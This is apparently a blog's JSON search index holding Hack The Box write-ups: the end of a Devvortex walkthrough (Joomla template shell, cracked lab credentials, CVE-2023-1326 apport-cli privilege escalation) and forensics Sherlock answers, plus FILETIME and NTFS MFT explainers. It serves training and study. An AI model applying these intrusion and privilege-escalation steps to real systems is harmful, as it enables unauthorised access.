8.0.35-0ubuntu0.20.04.1 server: linux devvortex 5.4.0-167-generic #184-ubuntu smp tue oct 31 09:21:49 utc 2023 x86_64 disable php functions: pcntl_alarm pcntl_fork pcntl_waitpid pcntl_wait pcntl_wifexited pcntl_wifstopped pcntl_wifsignaled pcntl_wifcontinued pcntl_wexitstatus pcntl_wtermsig pcntl_wstopsig pcntl_signal pcntl_signal_get_handler pcntl_signal_dispatch pcntl_get_last_error pcntl_strerror pcntl_sigprocmask pcntl_sigwaitinfo pcntl_sigtimedwait pcntl_exec pcntl_getpriority pcntl_setpriority pcntl_async_signals pcntl_unshare phar: php archive support is enabled. can be used to bypass upload restriction for a shell. getting foothold in the system menu joomla offeres option to customize a template. i customized a template by modifying a existing php file. by inserting a shellcode i was successful getting a shell on the box as www-data user.\nprivilege escalation shell stabilization the shell was not stable at all. i couldn\u0026rsquo;t see any interective output because i was missing an actual shell.\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ni was www-data and it\u0026rsquo;s shell was assigned nologin. i did the following to make the shell stable.\nscript /dev/null -c /bin/bash ctrl + z stty raw -echo; fg then press enter twice, and then enter: export term=xterm then i had a good enough shell to work with.\nuser enumeration after inspecting the /etc/passwd file i was sure that i had to escalate my privileges and take over logan account. i could list the account\u0026rsquo;s home directory and found the user flag but didn\u0026rsquo;t have permission to read it.\nservice enumeration after inspecting for users i tried to access the mysql database to find any credentials that can help me pivot to logan. so i logged in to the database service using the lewis:p4ntherg0t1n5r3c0n## and it worked.\nmysql enumeration databses:\nshow databases; +--------------------+ | database | +--------------------+ | information_schema | | joomla | | performance_schema | +--------------------+ tables:\n+-------------------------------+ | tables_in_joomla | +-------------------------------+ | sd4fg_action_log_config | | sd4fg_action_logs | | sd4fg_action_logs_extensions | | sd4fg_action_logs_users | | sd4fg_assets | | sd4fg_associations | | sd4fg_banner_clients | | sd4fg_banner_tracks | | sd4fg_banners | | sd4fg_categories | | sd4fg_contact_details | | sd4fg_content | | sd4fg_content_frontpage | | sd4fg_content_rating | | sd4fg_content_types | | sd4fg_contentitem_tag_map | | sd4fg_extensions | | sd4fg_fields | | sd4fg_fields_categories | | sd4fg_fields_groups | | sd4fg_fields_values | | sd4fg_finder_filters | | sd4fg_finder_links | | sd4fg_finder_links_terms | | sd4fg_finder_logging | | sd4fg_finder_taxonomy | | sd4fg_finder_taxonomy_map | | sd4fg_finder_terms | | sd4fg_finder_terms_common | | sd4fg_finder_tokens | | sd4fg_finder_tokens_aggregate | | sd4fg_finder_types | | sd4fg_history | | sd4fg_languages | | sd4fg_mail_templates | | sd4fg_menu | | sd4fg_menu_types | | sd4fg_messages | | sd4fg_messages_cfg | | sd4fg_modules | | sd4fg_modules_menu | | sd4fg_newsfeeds | | sd4fg_overrider | | sd4fg_postinstall_messages | | sd4fg_privacy_consents | | sd4fg_privacy_requests | | sd4fg_redirect_links | | sd4fg_scheduler_tasks | | sd4fg_schemas | | sd4fg_session | | sd4fg_tags | | sd4fg_template_overrides | | sd4fg_template_styles | | sd4fg_ucm_base | | sd4fg_ucm_content | | sd4fg_update_sites | | sd4fg_update_sites_extensions | | sd4fg_updates | | sd4fg_user_keys | | sd4fg_user_mfa | | sd4fg_user_notes | | sd4fg_user_profiles | | sd4fg_user_usergroup_map | | sd4fg_usergroups | | sd4fg_users | | sd4fg_viewlevels | | sd4fg_webauthn_credentials | | sd4fg_workflow_associations | | sd4fg_workflow_stages | | sd4fg_workflow_transitions | | sd4fg_workflows | +-------------------------------+ users:\n+----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | lewis | $2y$10$6v52x.sd8xc7hnlvwutri.ax4biayuhvbmvvnywrcebmy8xdezm1u | | logan | $2y$10$it4k5kmsgvhso9d6m/1w0eyib5ne9xzarqrfjtgthniy/ybtkij12 | +----------+--------------------------------------------------------------+ cracking the logan hash using john the ripper i was able to crack the hash for logan.\nlogan:tequieromucho\nlet\u0026rsquo;s try this credential to log on. i could successfully log in using ssh.\nroot privilege escalation after login into the logan account. i ran the command sudo -l with the above password. and i found following sudoers privileges for the account.\nmatching defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin user logan may run the following commands on devvortex: (all : all) /usr/bin/apport-cli so logan can run /usr/bin/apport-cli with sudo. after, searching for apport-cli\u0026rsquo;s know vulnerability i found a privilege escalation vulnerability for apport-cli \u0026lt;= v2.26.0 dubbed cve-2023-1326. the machine\u0026rsquo;s apport-cli version is 2.20.11. so it can be exploited if certain conditions are met. for more on the poc.\nsystem should specially configured to allow unprivileged users to run sudo apport-cli.\nless is configured as the pager.\nthe terminal size can be set.\nunfortunately all of the conditions were present in the box and we successfully gained root privilege following the steps described in poc. finally, acquired the root flag.\n","title":"HTB Machine Devvortex"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-sherlocks/noted/","summary":"Noted (DFIR) Scenario Simon, a developer working at Forela, notified the CERT team about a note that appeared on his desktop. The note claimed that his system had been compromised and that sensitive data from Simon\u0026rsquo;s workstation had been collected.","tags":["dfir","file","htb","noted","notepad++","sherlock","time","windows"],"text":"noted (dfir) scenario simon, a developer working at forela, notified the cert team about a note that appeared on his desktop. the note claimed that his system had been compromised and that sensitive data from simon\u0026rsquo;s workstation had been collected. the perpetrators performed data extortion on his workstation and are now threatening to release the data on the dark web unless their demands are met. simon\u0026rsquo;s workstation contained multiple sensitive files, including planned software projects, internal development plans, and application codebases. the threat intelligence team believes that the threat actor made some mistakes, but they have not found any way to contact the threat actors. the company\u0026rsquo;s stakeholders are insisting that this incident be resolved and all sensitive data be recovered. they demand that under no circumstances should the data be leaked. as our junior security analyst, you have been assigned a specific type of dfir (digital forensics and incident response) investigation in this case. the cert lead, after triaging the workstation, has provided you with only the notepad++ artifacts, suspecting that the attacker created the extortion note and conducted other activities with hands-on keyboard access. your duty is to determine how the attack occurred and find a way to contact the threat actors, as they accidentally locked out their own contact information.\nforensics artifacts: the artifacts are from notepad++ software. we have two xml files named config.xml and session.xml. we are also provided with two backup files of two text files lootandpurge.java@2023-07-24_145332 and you have been hacked.txt@2023-07-24_150548.\nextraction: the files were all in plaintext format and the volume of data was low, so extraction was not necessary. however, five files were created for classification purposes. they are file history of recently opened files, edited files in the alleged notepad++, custom uris the alleged notepad++ was set to handle, malicious data extortion java file and a ransom note file\nanalysis:\nfirst, i examined the config.xml file and found some file histories. the history contained the file addresses that were recently opened by the user. i have listed them in the file_history.txt file. also, i found some custom uris that were set to handle files from different types of services. they are listed in the custom_uris.txt file.\nsecond, i analyzed the session.xml file and there i found two files that were being edited along with their backup file locations and last modified timestamps. i added them to a file named edited_files.txt with the findings.\nfinally, i inspected the backup files and discovered a malicious java source file(lootandpurge.java) that was used to encrypt the sensitive data and a ransom note where two pastebin links were given to contact the cybercriminals. a password for the zip file was left behind by the perpetrators. which can be used to decrypt the content of the zip file. the same password can be used to decrypt the pastebin notes to find their ethereum wallet address and email address.\ntools used visual studio code python3 questions and answers q1: what is the full path of the script used by simon for aws operations?\na: c:\\users\\simon.stark\\documents\\dev_ops\\aws_objects migration.pl q2: the attacker duplicated some program code and compiled it on the system, knowing that the victim was a software engineer and had all the necessary utilities. they did this to blend into the environment and didn\u0026rsquo;t bring any of their tools. this code gathered sensitive data and prepared it for exfiltration. what is the full path of the program\u0026rsquo;s source file?\na: c:\\users\\simon.stark\\desktop\\lootandpurge.java. q3: what\u0026rsquo;s the name of the final archive file containing all the data to be exfiltrated?\na: forela-dev-data.zip q4: what\u0026rsquo;s the timestamp in utc when attacker last modified the program source file?\na: 2023-07-24 09:53:23 q5: the attacker wrote a data extortion note after exfiltrating data. what is the crypto wallet address to which attackers demanded payment?\na: 0xca8fa8f0b631ecdb18cda619c4fc9d197c8affca q6: what\u0026rsquo;s the email address of the person to contact for support?\na: cyberjunkie@mail2torjgmxgexntbrmhvgluavhj7ouul5yar6ylbvjkxwqf6ixkwyd.onion summary using the artifacts provided i was able to answer the questions. it was pretty straightforward. but answering question 4 was a little bit baffling to me. it was related to windows\u0026rsquo;s filetime system. i did a little bit of research and piece together an article that you can read here (filetime). also, i added a python script to convert it into utc.\n","title":"HTB Sherlock Noted"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-sherlocks/jingle-bell/","summary":"Jingle Bell (DFIR) Scenario Torrin is suspected to be an insider threat in Forela. He is believed to have leaked some data and removed certain applications from their workstation. They managed to bypass some controls and installed unauthorized software.","tags":["bell","database","dfir","htb","jingle","notification","push","sherlock","windows","wpndatabase"],"text":"jingle bell (dfir) scenario torrin is suspected to be an insider threat in forela. he is believed to have leaked some data and removed certain applications from their workstation. they managed to bypass some controls and installed unauthorized software. despite the forensic team\u0026rsquo;s efforts, no evidence of data leakage was found. as a senior incident responder, you have been tasked with investigating the incident to determine the conversation between the two parties involved.\nforensics we are given a windows push notification database file named wpndatabase.db. we can learn more about this database file on:\na digital forensic view of windows 10 notifications windows push notification (wpn) database parser users guide by tzworks from reading these articles we discovered that in that db file, there\u0026rsquo;s a table named notification. it contains the information of the notifications shown by windows\u0026rsquo;s notification manager as xml payload.\ntherefore, we used sqlitebrowser and manually dumped the xml data from the notification table. and saved them in the notifications.xml file.\nwe need to analyze this xml file to answer the following questions.\nquestions and answers q: which software/application did torrin use to leak forela\u0026rsquo;s secrets?\na: torrin used slack to leak the secrets. we know this from the notification\u0026rsquo;s \u0026lt;toast launch=\u0026quot;\u0026quot;\u0026gt; section. q: what\u0026rsquo;s the name of the rival company to which torrin leaked the data?\na: the rival company\u0026rsquo;s name is primetech innovations. we got this information from \u0026lt;header title=\u0026quot;\u0026quot;\u0026gt; section of the notification. q: what is the username of the person from the competitor organization whom torrin shared information with?\na: the username is cyberjunkie-primetechdev. we get this answer from \u0026lt;binding\u0026gt;\u0026rsquo;s second \u0026lt;text\u0026gt; tag where the attribute hint-style=\u0026quot;bodysubtle\u0026quot; exists. q: what\u0026rsquo;s the channel name in which they conversed with each other?\na: the channel name is forela-secrets-leak. we can derive this from \u0026lt;binding\u0026gt;\u0026rsquo;s first \u0026lt;text\u0026gt; tag where the attribute hint-maxlines=\u0026quot;1\u0026quot; exists. q: what was the password for the archive server?\na: the password for the archive server is tobdaf8qip$re@1. we get this from reading the body of a notification. q: what was the url provided to torrin to upload stolen data to?\na: the url is https://drive.google.com/drive/folders/1vw97vbmxdzuieueug64g5dlzvfp-pdll?usp=sharing. q: when was the above link shared with torrin?\na: when answering this question we faced some difficulties. two timestamps could be the answer to the question. firstly, the notification table has an arrivaltime timestamp expressed in microsoft filetime 64-bit format. when converted to date it gave gmt thu apr 20 2023 10:36:08. but it wasn\u0026rsquo;t the answer. secondly, there was another timestamp embedded inside the \u0026lt;toast launch=\u0026quot;slack://channel?id=c05451qsqm8\u0026amp;amp;message=1681986889.660179\u0026amp;amp;team=t054518aduj\u0026amp;amp;origin=notification\u0026quot;\u0026gt; tag of the notification\u0026rsquo;s xml structure. the message=1681986889.660179 converts to gmt thu apr 20 2023 10:34:49. turns out the latter one was the correct one. so, the answer is 2023-04-20 10:34:49. q: for how much money did torrin leak forela\u0026rsquo;s secrets?\na: the answer is 10000. we could find it in the notifications.xml file. ","title":"HTB Sherlock Jingle Bell"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-sherlocks/bft/","summary":"BFT (DFIR) Scenario In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity.","tags":["bft","dfir","file","htb","master","mft","sherlock","table","windows"],"text":"bft (dfir) scenario in this sherlock, you will become acquainted with mft (master file table) forensics. you will be introduced to well-known tools and methodologies for analyzing mft artifacts to identify malicious activity. during our analysis, you will utilize the mftecmd tool to parse the provided mft file, timeline explorer to open and analyze the results from the parsed mft, and a hex editor to recover file contents from the mft.\nforensics artifact: an mft file $mft is provided. it\u0026rsquo;s an ntfs file system\u0026rsquo;s master file table. learn more about mft here. extraction: i used mftecmd to extract the contents of it and saved it to a file in csv format. analysis: timeline explorer and 010editor were used to answer the questions. tools used mftecmd by eric zimmerman timeline explorer 010editor hex editor questions and answers q1: simon stark was targeted by attackers on february 13. he downloaded a zip file from a link received in an email. what was the name of the zip file he downloaded from the link?\na: the answer is stage-20240213t093324z-001.zip. i applied a filter on the header created0x10 with the date 2024-02-13 and on the header extension with the value .zip. q2: examine the zone identifier contents for the initially downloaded zip file. this field reveals the hosturl from where the file was downloaded, serving as a valuable indicator of compromise (ioc) in our investigation/analysis. what is the full host url from where this zip file was downloaded?\na: the answer is https://storage.googleapis.com/drive-bulk-export-anonymous/20240213t093324.039z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser.\nto find the url of the downloaded file i needed to locate the stage-20240213t093324z-001.zip:zone.identifier file by applying a filter on extension with the value .identifier. the zone.identifier file separated by a : after the original file is an alternate data stream (ads) file. it contains the file\u0026rsquo;s origin location. in this case, it was a url. it can be found under the zone id contents header.\nq3: what is the full path and name of the malicious file that executed malicious code and connected to a c2 server?\na: the answer is c:\\users\\simon.stark\\downloads\\stage-20240213t093324z-001\\stage\\invoice\\invoices\\invoice.bat. the file was found by applying a filter on the header parent path with the initial zip file\u0026rsquo;s partial name stage and a suspicious .bat file was discovered. q4: analyze the $created0x30 timestamp for the previously identified file. when was this file created on disk?\na: the answer is 2024-02-13 16:38:39. learn more about the difference between $created0x10 and $created0x30. q5: finding the hex offset of an mft record is beneficial in many investigative scenarios. find the hex offset of the stager file from question 3.\na: the answer is 16e3000. to find the answer i needed to look for the malicious file\u0026rsquo;s entry number which was 23436. then i multiplied it with 1024 23436*1024 because each entry in the mft is 1024 bytes in size. after that, i converted the decimal number to hex. q6: each mft record is 1024 bytes in size. if a file on disk has smaller size than 1024 bytes, they can be stored directly on mft file itself. these are called mft resident files. during windows file system investigation, its crucial to look for any malicious/suspicious files that may be resident in mft. this way we can find contents of malicious files/scripts. find the contents of the malicious stager identified in question3 and answer with the c2 ip and port.\na: the answer is 43.204.110.203:6666.\ni had the hex offset for the invoice.bat file\u0026rsquo;s entry and from the timeline explorer, and i discovered the file size was 286 bytes. so, it can be safely assumed it is an mft resident file. the contents of this file can be viewed using a hex editor.\ni opened up my hex editor went to the offset 16e3000 and found the file\u0026rsquo;s contents. it used powershell to download a payload from the above ip.\nsummary using the mft file i was able to discover a stager file residing in mft and the url which was used to deliver it initially. i also discovered a c2 server by reading the contents of that file. a timeline for this incident was also established using timeline explorer.\n","title":"HTB Sherlock BFT"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/filetime/","summary":"FILETIME in Windows What is FILETIME? A file time is a 64-bit value that represents the number of 100-nanosecond intervals that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC).","tags":["dfir","file","time","timestamp","windows"],"text":"filetime in windows what is filetime? a file time is a 64-bit value that represents the number of 100-nanosecond intervals that have elapsed since 12:00 a.m. january 1, 1601 coordinated universal time (utc). the system records file times when applications create, access, and write to files.\nthe ntfs file system stores time values in utc format, so they are not affected by changes in time zone or daylight saving time. the fat file system stores time values based on the local time of the computer.\ntime stamps are updated at various times and for various reasons. the only guarantee about a file time stamp is that the file time is correctly reflected when the handle that makes the change is closed.\nnot all file systems can record creation and last access times, and not all file systems record them in the same manner. for example, the resolution of create time on fat is 10 milliseconds, while write time has a resolution of 2 seconds and access time has a resolution of 1 day, so it is really the access date. the ntfs file system delays updates to the last access time for a file by up to 1 hour after the last access.\nfiletime structure (minwinbase.h) typedef struct _filetime { dword dwlowdatetime; dword dwhighdatetime; } filetime, *pfiletime, *lpfiletime; here, the dwlowdatetime is the low-order and the dwhighdatetime is the high-order part of the file time.\nolder compilers did not have support for 64 bit types. so the structure splits the 64 bit value into two 32 bit parts. the low part contains the least significant 32 bits. the high part contains the most significant 32 bits.\nconverting filetime to human readable format to convert the filetime into human readable format we need a unsigned 64 bit integer union. but 64 bit integer support may vary compiler to compiler based on cpu architecture and os versions. microsoft\u0026rsquo;s official documentation says it supports ularge_integer (unsigned 64 bit integer union) from windows 10 build 20348.\ntypedef union _ularge_integer { struct { dword lowpart; dword highpart; } dummystructname; struct { dword lowpart; dword highpart; } u; ulonglong quadpart; } ularge_integer; the ularge_integer structure is actually a union. if your compiler has built-in support for 64-bit integers, use the quadpart member to store the 64-bit integer. otherwise, use the lowpart and highpart members to store the 64-bit integer.\nso, many softwares uses the lowpart and highpart to store a unsigned 64 bit integer by splitting it into 32 bit each. for example notepad++ uses originalfilelastmodiftimestamp as lowpart and originalfilelastmodiftimestamphigh as highpart to store the filetime timestamps.\nto retrieve a human readable date/time from these two parts needs some arithmatic operations.\na simplest way to get the original filetime timestamp from lowpart and highpart is a by using the following formula.\nlowpart + 2^32 * highpart the formula does not provide a good enough precision. meaning the retrieved value may have some deviations of minutes and seconds.\nto retrive the precise date/time value we need to perform some bitwise operation on the lowpart and highpart in python to convert it into it\u0026rsquo;s original form (a 64 bit unsigned integer).\na filetime timestamp is a number in 100-nanosecond intervals that have elapsed since 12:00 a.m. january 1, 1601 coordinated universal time (utc) till the creation time of the timestamp. to get the creation time, we need to add it to the nanosecond value of the initial date (1601-01-01).\nps: we can convert the timestamp\u0026rsquo;s value to millisecond or second also. the retrived date/time will be in utc, as the initial value is in utc.\nhere\u0026rsquo;s a simple python script to convert splitted filetime timestamp to human readable format.\nimport datetime timestamp_low = -1354503710 timestamp_high = 31047188 full_timestamp = (timestamp_high \u0026lt;\u0026lt; 32) | (timestamp_low \u0026amp; 0xffffffff) print(full_timestamp) timestamp_seconds = full_timestamp / 10**7 print(timestamp_seconds) converted_date_from_file_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp_seconds) print(converted_date_from_file_time) references file times ularge_integer union filetime structure what is dwlowdatetime and dwhighdatetime how to create filetime in win32? htb discussion board ldap, active directory \u0026amp; filetime timestamp converter ","title":"Filetime"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/master-file-table/","summary":"What is a Master File Table? The Master File Table (MFT) is a system file in the NTFS file system (having the name $MFT) that stores metadata information about all files and directories on an NTFS volume.","tags":["dfir","file","master","table","windows"],"text":"what is a master file table? the master file table (mft) is a system file in the ntfs file system (having the name $mft) that stores metadata information about all files and directories on an ntfs volume. the mft acts as an index to all the files and directories on the volume, providing quick access to the information needed to retrieve a file.\neach file and directory on an ntfs volume has a unique record in the mft, known as an mft entry. the mft entry contains information such as the file name, timestamps, permissions, and a pointer to the files data. the corresponding mft entry is updated when a file is created or modified.\nwhen a file is deleted, the corresponding mft entry is marked as free, but the actual file data remains on the disk until it is overwritten by new data. this can be useful in data recovery scenarios, as the deleted files data may still be recoverable. successful data recovery requires that the disk regions occupied by the deleted data are not overwritten.\nnote: the mft is stored on the ntfs volume and is an important component of the ntfs file system. the mft must remain intact and undamaged for the file system to function properly.\nwhy is the mft useful for forensics? comprehensive data storage: the mft provides a detailed record of each file, including timestamps, permissions, and data content locations, making it invaluable for forensic investigations.\nrecovery of deleted files: even when files are deleted, their mft entries might not be immediately reused. this allows forensic analysts to recover details about the deleted files, which can be crucial in legal contexts.\ntracking file modifications: the mft includes multiple timestamps that record different types of file access and modifications. this can help construct a timeline of activities on a system, an essential aspect of forensic analysis.\ndetecting malware and unauthorized access: since the mft records file creation and modification details, unusual changes detected in these entries can indicate unauthorised access or malware activity.\ngeneral structure of mft record the structure of the master file table (mft) in the ntfs file system is complex and consists of multiple records, each of which represents a file or directory on the ntfs volume. each mft record is 1024 bytes, making the mft very simple to parse. an mft record has the following general structure:\nfile record header: this section contains information about the record itself, including the size of the record, the offset of the update sequence, and the flags that indicate the state of the file or directory.\nfile attribute list: this section contains a list of attributes that describe the file or directory, including its name, timestamps, size, and data. each attribute is stored as a separate structure with its format.\ndata runs: this section describes the location of the file or directorys data on the disk. the data runs are stored as a series of extents describing the starting cluster and the length of each contiguous data block.\nthe exact format and structure of the mft in ntfs can vary depending on the version of the file system in use. however, the general structure remains the same, with the file record header, file attribute list, and data runs being the main components of each mft entry.\nnote: its important to note that accessing the mft directly can be dangerous and potentially lead to file system corruption or data loss. before attempting to access or modify the mft, its recommended to perform operations on a backup of the mft or back up important data beforehand.\ndetailed breakdown of mft fields $standard_information\ncreation time: the date and time when the file or directory was created. modification time: the date and time when the file or directory was last modified. access time: the date and time when the file or directory was last accessed. entry modified time: the date and time when the mft entry itself was last modified. use case: these timestamps are vital for timeline analysis to determine the sequence of user actions and file usage. $file_name\nfile name: the name of the file or directory. parent directory: the mft record number of the directory in which the file resides. additional timestamps: similar to $standard_information, but specific to this attribute and sometimes used as a fallback. use case: this attribute is used to confirm the integrity of file paths and names in the system, which is crucial for tracking user movements and detecting unauthorised changes. $data\nactual data or pointer: either the data itself for smaller files or a pointer to the data for larger files. use case: direct analysis of file contents and data recovery, especially important in cases involving data theft or unauthorized data manipulation. $logged_utility_stream\ntransactional data: holds data related to transactional ntfs (txf), which logs temporary file state changes. use case: can be used to track changes made during a transaction, useful in cases of system crashes or unexpected shutdowns to determine interim states. $bitmap\ncluster allocation: maps which clusters are in use by the file. use case: useful for recovering deleted files or reconstructing file data from clusters not overwritten by new data. $security_descriptor\nowner id: identifies who owns the file. permissions: details what permissions are attached to the file (who can read, write, execute, etc.). audit settings: specifies what operations (like access or changes) are logged by the system. use case: critical for determining access rights and detecting potential security breaches where permissions may have been altered. $volume_information (specific to the mft entry for the volume itself)\nvolume serial number: unique identifier for the volume. flags: system flags related to the volume, such as whether its dirty (improperly unmounted). use case: useful in multi-disk systems to link files and activities to specific volumes, essential in systems recovery and forensic analysis across multiple drives. $index_root and $index_allocation\nindex entries: used in directories to index contained files for quick access. use case: forensically important for reconstructing directory structures and understanding how data was organized and accessed, particularly in complex investigations involving numerous files and directories. timestamps created (0x10) is the standard information (si) creation timestamp. this can be modified by user level processes, for example, timestomping. created (0x30) is the filename (fn) creation timestamp.\ntimestamps of (fn) - behave differently from timestamps of (si). these values don\u0026rsquo;t change or all of the values change at once. however, rename and moved in a local volume are exceptions. these processes are inherited from (si) value then set corresponding (fn) value. for more ntfs timestamps.\nmft resident files files that can be stored directly within the master file table (mft) known as resident files. the size of this kind of files varies depending on the file, the system, and the amount of metadata stored in the mft.\ngenerally, the more metadata associated with a file, the less space remains for storing the file\u0026rsquo;s data itself within the mft. while there is no strict upper limit, typically files smaller than approximately 900 bytes can be fully contained within their mft record.\nreferences geeksforgeeks kazamiya official writeup bft by cyberjunkie \u0026amp; sebh24 on htb ","title":"Master File Table"}]
}

